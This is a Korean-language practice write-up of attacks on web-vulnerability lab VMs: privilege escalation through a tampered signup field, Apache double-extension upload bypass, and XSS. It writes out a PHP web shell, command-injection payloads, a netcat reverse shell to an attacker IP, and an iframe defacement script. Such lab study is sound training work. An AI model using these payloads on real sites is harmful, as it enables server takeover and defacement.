웹취약점 VM 풀이

워게임 사이트와 별도로 받은 가상머신(VM) 환경에서, 계정 취약점·쿠키 조작·CMS 설정 오류 등을 직접 찾아 공격한 실습 기록

1. 계정정보 취약 머신 (account01)

권한 상승 & 업로드 우회

회원가입 시 userLv 값을 직접 admin으로 변경해 관리자 권한 획득. .php 확장자는 업로드가 막혀있지만 .php3은 필터를 통과하고 실제로 실행되는 것을 확인해 웹쉘 업로드.

2. 계정정보 취약 머신 (account02)

정보 수정 취약점으로 관리자 탈취

회원가입 후 정보 수정 화면에서 이름·이메일·id만으로 본인 확인을 하고 비밀번호를 변경할 수 있는 구조를 발견 → 이 취약점으로 admin 비밀번호를 직접 변경해 로그인.

업로드 필터 우회 (확장자 트릭)

Apache는 파일명을 점(.)으로 쪼개 오른쪽부터 검사하며, mime.types와 httpd.conf의 AddType 목록 중 하나에 등록된 확장자를 처음 만나면 그걸로 처리 방식을 확정한다는 점을 이용.

파일명필터 통과실행이유
cmd.php❌-정확히 .php로 끝나 필터에 걸림
cmd.php.jpg✅❌맨 오른쪽 jpg가 먼저 판정됨
cmd.php.kr✅✅등록 안 된 확장자는 무시, 앞의 php가 적용됨
<?php system($_GET['cmd']); ?>

cmd.php.kr 형태로 업로드 후 ?cmd=id 파라미터로 명령 실행 성공 확인.

3. cookie 계열 머신

cookie-01

업로드 파일이 원본 이름 대신 타임스탬프+난수 조합으로 저장되는 구조. 쿠키 값에서 URL 인코딩된 경로(%2F = /)를 디코딩해 /imginfo/파일명0.txt 형태의 정보 파일 경로를 발견, 접근에 성공. 이미지 업로드 시 패킷을 가로채 내용을 수정한 뒤 전송하는 방식도 함께 실습.

3. Command Injection (comminj)

사용자 입력값을 검증 없이 시스템 명령 실행 함수(system, exec, shell_exec 등)에 그대로 전달할 때 발생하는 취약점 실습.

XSS 발견

존재하지 않는 id 파라미터 값을 주면 그 값을 그대로 오류 메시지에 출력하는 구조(data_dir/[id].txt 파일을 찾을 수 없습니다) 확인 → <script>alert("hack")</script> 삽입으로 XSS 성공.

Command Injection

system("some_command " . $_GET['id'] . " .txt");

?id=100;cat /etc/hosts;cat data_dir/36

서버가 입력값 뒤에 자동으로 .txt를 붙이는 구조를 이용해, ;로 명령어를 추가하고 .txt는 더미 명령 쪽에 붙도록 유도해 임의 명령 실행 성공.

// kali에서 리스너 실행
nc -lvnp 5555

// 웹에서 리버스 쉘 연결
?id=100;nc 172.30.1.43 5555 -e /bin/bash &;cat data_dir/30

리버스 쉘 연결까지 성공해 웹쉘 수준의 명령 실행 권한 확보.

4. Deface

취약점으로 서버에 침투한 뒤, 원래 웹사이트 화면을 다른 내용(해킹 성공 메시지 등)으로 바꿔치기하는 공격 실습.

숨은 페이지 탐색

공개된 bbs_list.php의 네이밍 패턴(bbs_*)을 활용해 bbs_add.php 같은 비공개 등록 페이지를 유추해 접근, 여기서 XSS 취약점 발견.

공격 — 화면 전체 교체

python3 -m http.server 8080   // 공격자 웹서버 오픈
<script>document.body.innerHTML="<iframe width=100% height=100% src=http://172.30.1.43:8000/hacking.html scrolling=no frameborder=0></iframe>";</script>

document.body.innerHTML을 통째로 교체해 원래 페이지를 지우고, 공격자가 준비한 페이지를 iframe으로 화면 전체에 덮어씌우는 방식. 글자 수 제한 때문에 처음엔 렌더링 실패 → 여러 줄로 쪼개 JS 주석(/* */)으로 이어붙이고, 렌더링 순서를 맞추기 위해 게시판 제목에 역순으로 등록해 최종 성공.
